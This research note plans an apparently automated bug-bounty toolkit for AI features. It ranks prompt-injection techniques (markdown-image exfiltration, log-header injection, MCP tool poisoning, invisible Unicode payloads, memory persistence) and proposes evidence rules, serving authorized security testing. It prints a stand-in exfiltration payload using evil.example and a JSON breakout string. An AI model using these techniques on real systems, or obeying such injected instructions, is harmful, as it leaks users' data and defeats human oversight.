# 08 - AI-backed targets, and hunting methodology

Research note. Not projected, not a Skill, not a Playbook. Written against the
`agentic-ai` Playbook, its `llm.md` reference, and the six Skills as they stand.

Two fetch caveats govern what is asserted below. Everything cited was fetched
unless marked otherwise, and the pages that refused are listed at the end with
what was lost. Where a fact reached me only through a search-result summary and
not through a page I could open, it is marked *(unfetched)* at the point of use.

## Part A - attacking AI features

### What our agentic-ai playbook already covers

The Playbook is a single-class instrument and it is a good one. Read against the
field, it already encodes four things that most published work on this class
does not:

* **Non-determinism is the governing property.** Baseline at least three times,
  variant at least three times, difference the *sets*, cite the counts. The
  large-scale competition paper is the empirical case for this: 464 participants,
  272,000 attack attempts, 8,648 successes, with per-model success rates between
  0.5% and 8.5% (Dziemian, Lin, Fu et al., 16 Mar 2026). At a single-digit-percent
  success rate a one-shot transcript is a coin flip, which is exactly what step 2
  and step 4 refuse to file.
* **A control that plants the same instruction where the pipeline drops it.**
  Nothing else in the surveyed literature makes this a required step. It is the
  step that separates "the model read my text" from "the model varied".
* **The model's own prose is not evidence of the model's own actions.** `llm.md`
  grades observation kinds: an action the pipeline took beats a nonce in the
  answer beats a sentence. This matches the NVIDIA AI Red Team's framing and it
  is the rule that kills most published "AI vulnerability" write-ups.
* **The injection claim does not imply an impact claim.** Step 7 refuses to file
  an authorization or disclosure class from a marker that came back. This turns
  out to be the same line the paying programs draw (see *What bounty programs
  actually pay for*), arrived at independently.

It also covers the direct/indirect/stored channel split, one channel per run,
the treatment of every answer as untrusted content, and read-only discipline.

What it does **not** cover is everything downstream of the marker. Its
`bb:outputs` is `injection.model_instruction` and nothing else, and by design it
hands the chain off to classes no Playbook in the corpus produces. That is the
shape of the gap that Part A's ranking is about.

### Missing techniques (ranked by expected yield)

#### 1. Output-channel exfiltration: markdown images, links and other active content

*What it is.* The model is induced to emit an image reference, a link, or other
renderer-active markup whose URL carries data the attacker wants, and the
victim's client renders it and makes the request. Simon Willison's canonical
form is `![Loading](https://evil.example/log/?data=$BASE64)` (9 Aug 2025). NVIDIA's
AI Red Team lists "active content rendering of LLM outputs leading to data
exfiltration" as one of its three most significant findings across LLM
application assessments (2 Oct 2025).

*Why it finds bugs today.* This is where the CVEs are. Cursor's Mermaid diagram
renderer (CVE-2025-54132) allowed arbitrary image URLs; Amp Code shipped a fix
for image-render exfiltration; ChatGPT's domain allow-list was bypassed via Azure
storage; Google Jules leaked through markdown images. All four are in Rehberger's
August 2025 series. Google's own mitigation post names "markdown sanitization and
URL redaction" as a defence layer and says the system "will not render" external
image URLs (13 Jun 2025) - a defence only shipped because the attack pays. And
the defence itself is leaky: OpenAI's URL allow-list scheme, which whitelists
URLs its crawler has already indexed, is defeated by mapping one pre-indexed URL
per character (Rehberger's commentary, 4 Feb 2026).

*What our Playbook must be able to observe.* Three things it currently cannot:
(a) an outbound request that *the renderer or the target's egress* made, not one
the harness made - i.e. an out-of-band interaction; (b) the rendered document,
so the `src`/`href` that was emitted can be quoted from bytes rather than
described; (c) a control run in which the payload is absent and the same
subresource is not requested. `browser-evidence` gets us (b) and can reconcile
subresource Receipts, but (a) has no home anywhere in the six Skills.

Sources: <https://simonwillison.net/2025/Aug/9/bay-area-ai/> (9 Aug 2025);
<https://developer.nvidia.com/blog/practical-llm-security-advice-from-the-nvidia-ai-red-team/> (2 Oct 2025);
<https://simonwillison.net/2025/Aug/15/the-summer-of-johann/> (15 Aug 2025);
<https://blog.google/security/mitigating-prompt-injection-attacks/> (13 Jun 2025);
<https://embracethered.com/blog/posts/2026/data-exfiltration-mitigation-paper-by-openai/> (4 Feb 2026);
<https://cdn.openai.com/pdf/dd8e7875-e606-42b4-80a1-f824e4e11cf4/prevent-url-data-exfil.pdf> (Feb 2026, fetched but not text-extractable here).

#### 2. Second-order indirect injection: the channel nobody thought was a channel

*What it is.* The payload is planted in a store that a model later reads on
somebody else's behalf, and the store is not a document. Tenable's Gemini work
is the clearest case: a prompt injected into an HTTP `User-Agent` header, logged
by a GCP service, then read back when a *different* user asked Gemini Cloud
Assist to summarise logs. The payload broke out of the `userAgent` JSON field with
`"}}, <PROMPT INJECTION>`. Their second finding planted queries in the victim's
*browser history* via JavaScript, which the Search Personalization Model then
consumed as trusted context (30 Sep 2025).

*Why it finds bugs today.* The application's threat model covers the fields it
knows are user input. It does not cover log lines, error strings, filenames, alt
text, commit messages, ticket titles, calendar invites, or headers - and those are
precisely what gets piped into a summarisation feature. EchoLeak, the zero-click
Microsoft 365 Copilot bug Google's post names by name, was a single crafted email
(13 Jun 2025; the identifier CVE-2025-32711 appears in search results I did not
fetch and is not asserted here as verified).

*What our Playbook must be able to observe.* The Playbook's step 1 already
admits indirect channels but its examples stop at "a document the model
summarises". It needs (a) an enumerated channel list that includes non-body
channels, and (b) the two-principal shape: identity A plants, identity B's model
reads. Right now nothing binds those two exchanges into one claim; `use-identity`
runs a differential of A vs B against the *same* request, not a plant-then-read
across two.

Sources: <https://www.tenable.com/blog/the-trifecta-how-three-new-gemini-vulnerabilities-in-cloud-assist-search-model-and-browsing> (30 Sep 2025);
<https://blog.google/security/mitigating-prompt-injection-attacks/> (13 Jun 2025).

#### 3. Tool and function-calling abuse (excessive agency, confused deputy)

*What it is.* The model holds a tool whose authority exceeds the caller's, and
attacker text steers the call. PortSwigger's teaching methodology is three steps:
identify the LLM's direct and indirect inputs, "work out what data and APIs the
LLM has access to", then probe that surface. Their excessive-agency lab wires a
raw-SQL debug API behind a support chatbot. NVIDIA's number-one finding is
`exec`/`eval` on LLM-generated output without isolation, reached through prompt
injection.

*Why it finds bugs today.* It is an authorization bug with a language model
standing in for the missing check, and authorization bugs are the ones programs
pay for. Rehberger's series turned this into remote code execution repeatedly:
AWS Kiro (26 Aug 2025), Amazon Q Developer (19 Aug 2025), GitHub Copilot
(CVE-2025-53773, 12 Aug 2025).

*What our Playbook must be able to observe.* A backend effect that the baseline
set never produces, observed through a channel other than the model's prose - a
Receipt for a request the target made, a record readable through a second
identity, a status change. `llm.md` already ranks this observation highest; no
Playbook in the corpus produces it, and `injection.model_instruction` is not the
class it belongs to.

Sources: <https://portswigger.net/web-security/llm-attacks> (undated, PortSwigger Web Security Academy);
<https://developer.nvidia.com/blog/practical-llm-security-advice-from-the-nvidia-ai-red-team/> (2 Oct 2025);
<https://embracethered.com/blog/posts/2025/wrapping-up-month-of-ai-bugs/> (30 Aug 2025).

#### 4. Retrieval scope and RAG store permissions

*What it is.* Two distinct bugs wearing one name. **Read scope**: permissions
from the originating source (Confluence, Workspace, a ticket system) are not
preserved through ingestion, or an over-permissioned service token backs the
index, so the retriever returns documents the asking principal cannot otherwise
read. **Write scope**: anyone who can get content into the index has an indirect
injection channel - NVIDIA's example is a user's own email arriving in the
retrieval corpus.

*Why it finds bugs today.* Read-scope failures are ordinary cross-tenant IDOR
with an embedding layer in front, they are trivially provable, and they land in
the highest-paying category on the programs that publish one. Write-scope
failures are the delivery mechanism for everything in items 1 and 2. NVIDIA
names insecure RAG data store permissions as one of its three top findings and
says the write-access case "is often an early element of an attack chain".

*What our Playbook must be able to observe.* A nonce document written by
identity A appearing in identity B's answer, where B has no route to that
document by any non-model path. That is a two-identity differential with a nonce,
and `use-identity` plus `compare-responses` can carry it once someone names the
shape. It is also the one AI-adjacent finding that does *not* need the
non-determinism machinery: a nonce is either in the answer or it is not.

Sources: <https://developer.nvidia.com/blog/practical-llm-security-advice-from-the-nvidia-ai-red-team/> (2 Oct 2025);
<https://docs.modulos.ai/frameworks/owasp-top-10-llm/index> (OWASP LLM08:2025, Vector and Embedding Weaknesses).

#### 5. MCP and tool-surface poisoning, and agent-to-agent chains

*What it is.* Invariant Labs' Tool Poisoning Attack: instructions hidden in an
MCP tool *description*, which the model reads in full while the client shows the
user "a simple summarized tool name, where tool arguments are hidden behind an
overly simplified UI representation" (1 Apr 2025). Variants: **rug pull** (the
server changes a description after the client approved it) and **shadowing** (a
malicious server's description alters the agent's behaviour toward a *different*,
trusted server). The agent-to-agent form is Rehberger's cross-agent privilege
escalation: an injected Copilot writes to Claude Code's `.mcp.json` or
`CLAUDE.md`, and the second agent picks up the malicious configuration on next
run (24 Sep 2025).

*Why it finds bugs today.* The visibility gap between what the user approved and
what the model was told is structural, not a coding mistake, and it survives
every review the user performs. The rug-pull variant additionally defeats
one-time approval by construction.

*What our Playbook must be able to observe.* (a) The tool manifest as the model
receives it, byte for byte, as an Artifact; (b) the same manifest re-fetched
later and differenced - a rug pull is literally a `compare-responses` run over
two fetches of one document; (c) what the user-facing surface displayed for the
same tool, from `capture_dom` or `screenshot`. The claim is the *difference*
between (a) and (c), and that is a shape the corpus can already express.

Sources: <https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks> (1 Apr 2025);
<https://embracethered.com/blog/posts/2025/cross-agent-privilege-escalation-agents-that-free-each-other/> (24 Sep 2025).

#### 6. Invisible and obfuscated payload encodings

*What it is.* Unicode Tags-block codepoints (U+E0000-U+E007F) mirror printable
ASCII, render as nothing in browsers, terminals, editors and review tools, and
are tokenized by the model as readable text. Also: HTML comments, white-on-white
text, zero-width characters, and ANSI escape sequences. Rehberger backdoored line
5 of a legitimate agent Skill file this way and reports it working against Claude
Code, claude.ai, GitHub Copilot with Claude 4.5 models, Gemini and Grok
(11 Feb 2026).

*Why it finds bugs today.* It is not a bug class on its own; it is what converts
"won't fix, the user can see the instruction" into a finding, and it defeats the
human-in-the-loop control that every vendor's mitigation story rests on. It also
makes stored-injection findings materially more serious.

*What our Playbook must be able to observe.* The exact codepoints, preserved.
A quotation that silently drops invisible characters is not a faithful quotation
of the Artifact, and an agent that normalises them away while reading has
destroyed the evidence. Paired with this: an absence assertion on the rendered
surface, which is exactly the `assert_absent` false-pass hazard `browser-evidence`
already warns about - here the false pass would be the *finding*, so the wait
discipline matters more, not less.

Sources: <https://embracethered.com/blog/posts/2026/scary-agent-skills/> (11 Feb 2026);
<https://embracethered.com/blog/posts/2025/wrapping-up-month-of-ai-bugs/> (30 Aug 2025, invisible prompt injection against Windsurf, Amazon Q, Amp Code, Google Jules);
<https://simonwillison.net/2025/Aug/15/the-summer-of-johann/> (15 Aug 2025).

#### 7. Server-side fetch and file access through model-held tools

*What it is.* SSRF and path traversal where the request originates from the
model's tool rather than from a parameter. Tenable's third Gemini finding
instructed the Browsing Tool to fetch a URL with victim data in the query string,
and they proved it by capturing the inbound request server-side - explicitly
"bypassing UI-level defenses like markdown filtering". The file-read form is the
Anthropic Filesystem MCP server's directory-access bypass via a `.startsWith()`
path check (3 Aug 2025).

*Why it finds bugs today.* The tool's egress is not the user's egress, so it is
frequently inside a trust boundary the parameter-level SSRF checks never covered,
and the "URL" never appears in a request the WAF sees.

*What our Playbook must be able to observe.* Same requirement as item 1: an
inbound interaction at a host we control, correlated to a run. Plus, for the file
case, content the calling identity has no route to by any other path.

Sources: <https://www.tenable.com/blog/the-trifecta-how-three-new-gemini-vulnerabilities-in-cloud-assist-search-model-and-browsing> (30 Sep 2025);
<https://embracethered.com/blog/posts/2025/wrapping-up-month-of-ai-bugs/> (30 Aug 2025).

#### 8. Persistence: memory and configuration poisoning

*What it is.* The injected instruction is written into somewhere durable - a
memory feature, a saved-context store, an agent config file - so it fires in
sessions that contain no payload. Rehberger's SpAIware line covers Windsurf's
memory-persistent exfiltration (22 Aug 2025) and Gemini memory persistence via
delayed tool invocation (10 Feb 2025); the promptware kill-chain paper formalises
persistence as stage 4 of 7 and reports that of 36 studied studies and incidents,
"at least twenty-one attacks traverse four or more stages".

*Why it finds bugs today.* It is named in scope, by name, in the one published
AI bounty policy with a reward table: "persistent manipulation of a victim's AI
environment" *(unfetched policy page; see sources)*.

*What our Playbook must be able to observe.* A three-phase run: payload sent,
then a clean session with no payload, then the marker still appearing. This is a
different evidence shape from the current baseline/control/variant triple, and it
writes state - which the current Playbook forbids outright in step 8. That
prohibition is the right default; reaching this class needs a separate,
explicitly consented Playbook with a documented clean-up step, not a relaxation
of this one.

Sources: <https://embracethered.com/blog/> post index, entries dated 10 Feb 2025 and 22 Aug 2025;
<https://arxiv.org/abs/2601.09625> (Brodt, Feldman, Schneier, Nassi, 14 Jan 2026, rev. 10 Feb 2026).

#### 9. System prompt, tool schema and configuration extraction

*What it is.* Getting the model to emit its own instructions, its tool
definitions, or provider configuration. OWASP gives it a slot of its own,
LLM07:2025 System Prompt Leakage.

*Why it ranks here and not higher.* As a standalone report it is close to
worthless: `llm.md` already says the system prompt "is not a secret worth a
report on its own", and Google's AI VRP declines "data extraction that
reconstructs non-sensitive or public information" *(unfetched policy page)*. Its
real value is **reconnaissance for item 3** - the tool schema names the functions,
their arguments and their authority, which is the input PortSwigger's
methodology step 2 asks for. Treat it as surface, not as a finding.

*What our Playbook must be able to observe.* Nothing new. It must, however,
refuse to promote it: an extracted prompt is a claim the model made about itself,
and `handle-untrusted-content` already governs that.

Sources: <https://docs.modulos.ai/frameworks/owasp-top-10-llm/index> (LLM07:2025);
<https://portswigger.net/web-security/llm-attacks>.

#### 10. Cost and quota abuse

*What it is.* OWASP LLM10:2025 Unbounded Consumption - "cost, latency, or
capacity is exhausted by abuse or missing limits".

*Why it ranks last.* On a live authorized target it is the technique most likely
to do harm and least likely to pay. The one published AI reward table pays for
*persistent* denial of service, not for demonstrating that inference is expensive
*(unfetched policy page)*.

*What our Playbook must be able to observe.* An amplification ratio measured
from the target's own surface - one cheap request producing N expensive model
calls, read off timing, a usage counter or a quota header - never from volume
sent. A run that establishes cost by generating cost has caused the harm it
reported.

Sources: <https://docs.modulos.ai/frameworks/owasp-top-10-llm/index> (LLM10:2025);
<https://www.securityweek.com/google-offers-up-to-20000-in-new-ai-bug-bounty-program/> (8 Oct 2025).

### What bounty programs actually pay for here

The single most useful document found in this research is Google's AI VRP scope,
announced 8 October 2025. I could not open the rules page itself (it returned no
body), so the following is from SecurityWeek's report of it, which is consistent
with a second search summary of the same rules page:

* **Paid.** Attacks that modify a victim's account or data (up to $20,000 on
  flagship products: Search AI features, Workspace core apps, Gemini Apps);
  sensitive data exfiltration ($15,000 flagship and standard, $10,000 other);
  model parameter exfiltration; persistent manipulation of a victim's AI
  environment; unauthorized access to server-side features; persistent denial of
  service; convincing phishing via HTML injection without the user-generated
  content warning.
* **Not paid.** "Prompt injections, jailbreaks, and alignment issues." Also
  violative or misleading content generated in the user's own session, copyright
  issues, and extraction of non-sensitive or public information. Google's stated
  reason is that a VRP is not the right format for content problems.

The consequence for us is blunt and it is already half-encoded in `llm.md`:
**injection is the vector, never the finding.** Our `injection.model_instruction`
is a legitimate internal Property - it is the thing the evidence rules can
actually settle - but a report that ends there ends on the exact string the
largest published AI programme lists as out of scope. The Playbook's step 7 is
right that the impact classes need their own evidence; what is missing is any
route to producing that evidence.

Two corroborating signals. First, the CVEs in this space are assigned against
the *application*, not the model: CVE-2025-54132 (Cursor, Mermaid rendering),
CVE-2025-53773 (GitHub Copilot, RCE via settings write), CVE-2025-55284 (Claude
Code, DNS exfiltration), CVE-2026-24299 (Microsoft Copilot, per Rehberger's post
index). Every one is an output-handling, tool or configuration bug. Second, the
vendors themselves have stopped treating injection as fixable: OpenAI's position
on Atlas is that prompt injection "may never be 'solved'" for browser agents
(30 Dec 2025), and Google DeepMind reports that Spotlighting and self-reflection
defences "became much less effective against adaptive attacks", concluding that
defences tested only against static attacks give "a false sense of security"
(20 May 2025). A vendor who has publicly accepted the class will not pay for a
demonstration of the class.

Sources: <https://www.securityweek.com/google-offers-up-to-20000-in-new-ai-bug-bounty-program/> (8 Oct 2025);
<https://bughunters.google.com/about/rules/google-friends/ai-vulnerability-reward-program-rules> (rules page, could not be read - see sources list);
<https://simonwillison.net/2025/Aug/15/the-summer-of-johann/> (15 Aug 2025, CVE numbers);
<https://embracethered.com/blog/> (post index, CVE-2026-24299);
<https://cyberscoop.com/openai-chatgpt-atlas-prompt-injection-browser-agent-security-update-head-of-preparedness/> (30 Dec 2025);
<https://deepmind.google/blog/advancing-geminis-security-safeguards/> (20 May 2025).

## Part B - methodology and our Skills

### What each of our six Skills does well

* **enumerate-surface.** Deduplication before proposal, one Receipt per exchange,
  and a hard stop at the edge of enumeration. The rule that a blocked Receipt is
  a control condition rather than a prompt to try another spelling is the single
  best anti-drift rule in the corpus.
* **analyse-source.** Extraction by recorded tool run rather than by eye, every
  proposed route carrying the Artifact hash, and the `paths` versus `literals`
  split that keeps the query string out of the route. Stops before reachability.
* **use-identity.** Credentials never enter the Agent's frame; only labels do.
  One authorization dimension per comparison. A lease refusal is a control
  condition and is reported as one rather than routed around.
* **compare-responses.** Turns a claim about two exchanges into a number a second
  party can recompute, and treats `identical: true` as a result. Refuses to
  substitute a status line for a sealed body.
* **handle-untrusted-content.** The clearest statement of the trust boundary I
  found anywhere in this research, vendor material included: quote never adopt,
  authority cannot widen, and an embedded instruction is itself an observation
  about the target. Hand back inconclusive rather than improvise.
* **browser-evidence.** Plan digest versus result digest, so a difference is
  about the target rather than about the plan. The wait discipline, the
  enumeration of five untrusted output channels, the run-it-twice rule, the
  symptom table, and the honest note on when a browser is the wrong tool.

### What the best hunters do that our Skills do not encode

1. **They score targets before spending on them.** XBOW scored domains by WAF
   presence, authentication requirements, endpoint count and underlying
   technologies, and used that to decide where to work (24 Jun 2025). Our
   `enumerate-surface` types entities and records them; it emits no priority
   signal at all, so the scheduler has nothing to rank on.
2. **They suppress duplicates mechanically, at content level.** XBOW used SimHash
   for content similarity and image hashing for visual comparison, specifically
   to avoid burning effort on cloned environments. Our deduplication cell is
   per-entity-label. Two hosts serving the same application are two queues of
   work.
3. **They prove exfiltration with an out-of-band callback.** Tenable proved the
   Gemini Browsing Tool finding by capturing server-side requests containing
   victim data. Rehberger's DNS exfiltration findings are the same shape. Not one
   of our six Skills has any concept of an interaction we did not initiate.
4. **They finish the chain.** The published findings that get CVEs and payouts
   end at data belonging to another principal, or at a state change. Our Playbook
   ends at link one and hands off to classes nothing produces.
5. **They adapt the payload and record the ladder.** DeepMind's finding is that
   static attack sets understate risk because defences are tuned to them. Our
   Playbook sends one marker payload in one encoding, and correctly forbids
   raising the repeat count to chase a result - but it has no notion of a
   *declared, bounded* payload ladder (plain, then delimiter break, then
   encoded, then invisible codepoints) where each rung is its own recorded run
   with its own control.
6. **They ship a reproduction a triager can run.** `browser-evidence` produces a
   plan digest, which is the raw material for exactly this, but nothing in the
   corpus assembles a minimal deterministic repro aimed at a human.
7. **They read the programme's rules before they spend.** For AI features this is
   decisive, because the classes a naive hunter reaches first - jailbreak, system
   prompt, weird output - are the classes named out of scope. No Skill reads or
   records scope and reward policy.
8. **They treat a hallucinated report as a cost imposed on someone else.** Curl's
   maintainer measured it: roughly 20% of 2025 submissions were AI slop, the
   valid rate fell to about 5%, and each report "engages 3-4 persons. Perhaps for
   30 minutes, sometimes up to an hour or three. Each." (14 Jul 2025). The
   Bugcrowd guest piece states the test plainly: "If you cannot explain a
   vulnerability, reproduce the behavior, and articulate why it matters, you
   should not be submitting it." (5 Feb 2026). Our Skills enforce evidence
   discipline per Task; nothing states the externality, which is the reason the
   discipline exists.

Sources: <https://xbow.com/blog/top-1-how-xbow-did-it> (24 Jun 2025);
<https://www.tenable.com/blog/the-trifecta-how-three-new-gemini-vulnerabilities-in-cloud-assist-search-model-and-browsing> (30 Sep 2025);
<https://deepmind.google/blog/advancing-geminis-security-safeguards/> (20 May 2025);
<https://daniel.haxx.se/blog/2025/07/14/death-by-a-thousand-slops/> (14 Jul 2025);
<https://www.bugcrowd.com/blog/hacker-opinion-piece-how-lazy-hacking-killed-curls-bug-bounty/> (5 Feb 2026).

### Proposed Skill changes

One bullet per Skill. Each names what to add, not how to write it.

* **enumerate-surface** - add AI-surface typing as a recorded entity kind, and a
  priority signal per entity. The AI facts a hunter needs are: which endpoints
  reach a model; what tools or functions the model holds and with whose
  authority; whether model output is rendered as markdown, HTML or a diagram
  language; whether a retrieval store exists and who can write to it; whether an
  MCP or tool manifest is served. Today these are invisible to the scheduler, so
  the `tech_llm` trigger fires on "there is a chatbot" and nothing finer.
* **analyse-source** - add an AI-configuration sink list alongside the existing
  per-language sink references: system prompt string literals, tool and function
  schemas, MCP server manifests, model and provider identifiers, markdown and
  HTML renderer configuration (including image and link allow-lists), and egress
  allow-lists. Extract them by recorded tool run exactly as routes are, so the
  tool inventory is grounded in bytes instead of asked of the model.
* **use-identity** - name the **plant-and-read** shape: identity A writes content,
  identity B's model reads it, and the claim is about the pair of exchanges
  rather than about one request sent twice. Add cross-tenant retrieval as an
  explicit authorization dimension, since a nonce document reachable through B's
  model and not through B's API is the cleanest RAG-scope finding there is.
* **compare-responses** - add a set-versus-set mode. The `agentic-ai` Playbook
  requires differencing *n* baselines against *n* variants and citing counts, and
  `compare.py` only does pairwise, so the Playbook's central instruction
  currently has no script behind it. Add a marker-occurrence mode that returns
  counts per set rather than a line diff, and make byte-exactness explicit for
  non-ASCII codepoints.
* **handle-untrusted-content** - add invisible-payload fidelity. Anything read
  must be recorded with its Unicode Tags-block, zero-width, bidi and ANSI escape
  content intact, and a quotation that normalises those away is not a faithful
  quotation of the Artifact hash it claims. Add the reverse rule too: a payload
  the run *sends* must be recorded as codepoints, not as its rendered appearance.
* **browser-evidence** - add a rendered-output-channel checklist to be reconciled
  against the run's Receipts: image `src`, anchor `href`, `iframe`, `svg`,
  diagram-language renderers such as Mermaid, autolinked bare URLs, and any
  favicon or prefetch. The evidence for output-handling exfiltration is that a
  subresource request left the browser and reached a host the payload named, and
  that reconciliation is a step, not an inference.

### Proposed new Skills, if any

**One: `observe-out-of-band`.**

Justification, against the bar that an existing Skill genuinely cannot hold it:
every one of the six Skills observes a response to a request the harness made.
`enumerate-surface`, `use-identity` and `browser-evidence` all key their evidence
to a Receipt for an exchange we initiated. An out-of-band interaction has no such
exchange - it is a DNS query or an HTTP request that arrived at a host we control,
sent by the target's egress or by a victim's renderer, with nothing of ours on
the request path. It needs its own identifier minting (a nonce per run, bound to
the Hypothesis before the payload is sent), its own correlation rule (which
interaction belongs to which run, and what a collision means), its own retention
of the inbound record as an Artifact, and its own negative-result rule: **absence
of a callback is evidence only if the channel was proven live by a positive
control in the same run.** None of that fits inside a Skill whose subject is a
request/response pair.

This is also the highest-leverage single addition in this document. Items 1, 7
and most of 3 in Part A are unreachable without it, and those are the items the
programs pay for.

**Not proposed: an "escalate impact" Skill.** Chaining a proven injection into an
authorization or disclosure claim is a *Playbook* - it has an ordered argument, a
control step and an output class - and splitting it into a Skill would put the
judgement in the reusable half where it cannot carry evidence rules. Likewise
"score targets" belongs in `enumerate-surface`'s output, not in a Skill of its
own.

## Anti-hallucination rules worth encoding

What the harness should force an LLM hunter to do *before* it may call something
a finding. Several of these already exist inside the `agentic-ai` Playbook; the
proposal is to lift them to harness-level gates so they bind every run against a
`tech_llm` subject rather than only the run that happens to load that Playbook.

1. **Nonce-before-send.** The marker must be a value the run minted and recorded
   *before* the payload was sent. A finding resting on a string that could
   plausibly occur naturally in the answer is refused. This is what makes "the
   marker appeared" checkable rather than judged.
2. **Sets, not pairs.** For any subject typed as reaching a language model: at
   least three baselines, at least three variants, and a stated control that was
   itself invariant against the baseline. Counts in the write-up or no claim.
3. **Prose is not effect.** The model asserting that it did something is never
   evidence that it did. Any claim of an action requires a second observation on
   a non-prose channel: a Receipt for a request the target made, an out-of-band
   interaction, or a state read back through a different identity.
4. **Every claim carries a hash and a run.** No route, no parameter, no
   difference and no impact without the Artifact hash and the Tool run or Receipt
   that produced it. Already the corpus's spine; make it explicit that a model's
   answer is an Artifact like any other and is not a substitute for one.
5. **Quotation fidelity, including what does not render.** Quote bytes from the
   Artifact, with invisible codepoints preserved and named. Never a paraphrase,
   never a re-typed payload, never a description of what a screenshot appeared to
   say.
6. **Impact classes need their own evidence.** Filing an authorization or
   disclosure class from an injection marker is refused at the gate, not
   corrected at review. The reverse holds too: an impact finding does not need
   an injection claim attached to it.
7. **Scope gate before spend.** The programme's AI policy must be read and
   recorded as an Artifact before the first payload. If the class the run intends
   to produce is excluded - jailbreak, alignment, generated content, model
   behaviour in the caller's own session - the run stops before sending anything.
8. **Declare the variance.** The report must state the baseline's own variance.
   Where the baseline already differs at the level the finding claims, the verdict
   is inconclusive; it is not "supported with caveats".
9. **No unverified identifiers.** A CVE number, product version, vendor name,
   researcher attribution or tool name may appear only if it was quoted from a
   stored Artifact. Otherwise it is omitted. (This document follows that rule and
   marks its own exceptions.)
10. **Positive control for silence.** Absence of an out-of-band interaction, an
    absent assertion on a rendered page, or an empty diff may be reported as a
    negative result only if the channel was demonstrated live in the same run.
    `assert_absent` on a document that had not rendered yet is the canonical
    false pass, and the same hazard applies to a callback host nobody proved was
    reachable.
11. **One channel per run.** Already in the Playbook. It generalises: a run that
    varies two things has answered about neither, and an agent that adds a second
    variable because the first was ambiguous has destroyed its own control.
12. **An ambiguous set is the answer.** Escalating repeats, widening the payload,
    or re-running in the hope of a different visibility is forbidden. Also
    already in the Playbook; it is the rule most worth generalising, because it
    is the exact behaviour that produced the slop volume curl measured.

## Sources consulted

**Fetched and read.**

* <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/> (16 Jun 2025) - the trifecta definition: private data, untrusted content, external communication; the "guardrails won't protect you" argument.
* <https://simonwillison.net/2025/Aug/9/bay-area-ai/> (9 Aug 2025) - markdown-image exfiltration payload form; the GitHub MCP public-PR leak; "in application security, 99% is a failing grade"; why prompt begging fails.
* <https://simonwillison.net/2025/Aug/15/the-summer-of-johann/> (15 Aug 2025) - day-by-day list of Rehberger's August 2025 findings with vulnerability class per tool; CVE-2025-54132 and CVE-2025-53773; vendors leaving issues unfixed past disclosure windows.
* <https://simonwillison.net/2025/Apr/11/camel/> (11 Apr 2025) - CaMeL / "Defeating Prompt Injections by Design" (Google DeepMind): dual LLM, capability tags, why detection-based defence is probabilistic.
* <https://embracethered.com/blog/posts/2025/wrapping-up-month-of-ai-bugs/> (30 Aug 2025) - 29 posts, the tool list, and the recurring classes: invisible injection, DNS exfiltration, config write, ZombAI remote control; CVE-2025-55284.
* <https://embracethered.com/blog/> - verified post titles, dates and URLs for the 2025-2026 archive; source for CVE-2026-24299 and for the memory-persistence entries.
* <https://embracethered.com/blog/posts/2026/scary-agent-skills/> (11 Feb 2026) - hidden Unicode Tag instructions in agent Skill files; affected products; why human review does not catch it.
* <https://embracethered.com/blog/posts/2026/data-exfiltration-mitigation-paper-by-openai/> (4 Feb 2026) - OpenAI's URL allow-list mitigation and the per-character pre-indexed-URL bypass.
* <https://embracethered.com/blog/posts/2025/cross-agent-privilege-escalation-agents-that-free-each-other/> (24 Sep 2025) - one agent writing another agent's `.mcp.json` / `CLAUDE.md` to escalate.
* <https://embracethered.com/blog/posts/2026/given-enough-agents-all-bugs-become-shallow/> (7 Apr 2026) - agents doing exploit development; the author's own caution about vendor capability claims.
* <https://blog.google/security/mitigating-prompt-injection-attacks/> (13 Jun 2025) - Google's five defence layers; names EchoLeak; markdown sanitization and URL redaction as a shipped control.
* <https://blog.google/security/architecting-security-for-agentic/> (8 Dec 2025) - Agent Origin Sets (read-only vs read-writable origins), User Alignment Critic, confirmation gates for payments and sign-in.
* <https://deepmind.google/blog/advancing-geminis-security-safeguards/> (20 May 2025) - adaptive attacks defeat Spotlighting and self-reflection; static-benchmark defences give "a false sense of security"; automated red teaming.
* <https://www.tenable.com/blog/the-trifecta-how-three-new-gemini-vulnerabilities-in-cloud-assist-search-model-and-browsing> (30 Sep 2025) - log-to-prompt injection via `User-Agent`, browser-history search injection, Browsing Tool exfiltration, and how each was proved.
* <https://developer.nvidia.com/blog/practical-llm-security-advice-from-the-nvidia-ai-red-team/> (2 Oct 2025) - the three most significant findings across their assessments: `exec`/`eval` RCE, RAG store permissions, active content rendering; concrete mitigations for each.
* <https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks> (1 Apr 2025) - tool description poisoning, rug pulls, shadowing, and the user-visible-vs-model-visible gap.
* <https://portswigger.net/web-security/llm-attacks> (undated) - the three-step LLM methodology, API mapping, chaining through LLM-held APIs, insecure output handling.
* <https://arxiv.org/abs/2603.15714> (16 Mar 2026) - Dziemian, Lin, Fu et al., large-scale indirect prompt injection competition: 464 participants, 272,000 attempts, 8,648 successes, 0.5%-8.5% per-model success, universal strategies transferring across 21 of 41 behaviours.
* <https://arxiv.org/abs/2601.09625> (14 Jan 2026, rev. 10 Feb 2026) - Brodt, Feldman, Schneier, Nassi, the seven-stage promptware kill chain; 21 of 36 studied attacks traverse four or more stages.
* <https://anthropic.com/engineering/claude-code-sandboxing> (20 Oct 2025) - filesystem plus network isolation as jointly necessary against a prompt-injected coding agent; egress proxy with domain restriction.
* <https://cyberscoop.com/openai-chatgpt-atlas-prompt-injection-browser-agent-security-update-head-of-preparedness/> (30 Dec 2025) - OpenAI's new attack class found by automated red teaming; "may never be 'solved'" for browser agents.
* <https://daniel.haxx.se/blog/2025/07/14/death-by-a-thousand-slops/> (14 Jul 2025) - the cost of a plausible false report: ~20% of 2025 submissions slop, ~5% valid, 3-4 people per report.
* <https://www.bugcrowd.com/blog/hacker-opinion-piece-how-lazy-hacking-killed-curls-bug-bounty/> (5 Feb 2026) - the submitter's test (explain, reproduce, articulate impact); AI as research assistant under human judgement.
* <https://xbow.com/blog/top-1-how-xbow-did-it> (24 Jun 2025) - automated validators (headless browser confirming JS execution for XSS), SimHash and image-hash duplicate detection, domain scoring for target selection, ~1,060 submissions and their severity split.
* <https://www.securityweek.com/google-offers-up-to-20000-in-new-ai-bug-bounty-program/> (reporting a programme announced 8 Oct 2025) - the AI VRP reward tiers and the in-scope / out-of-scope split.
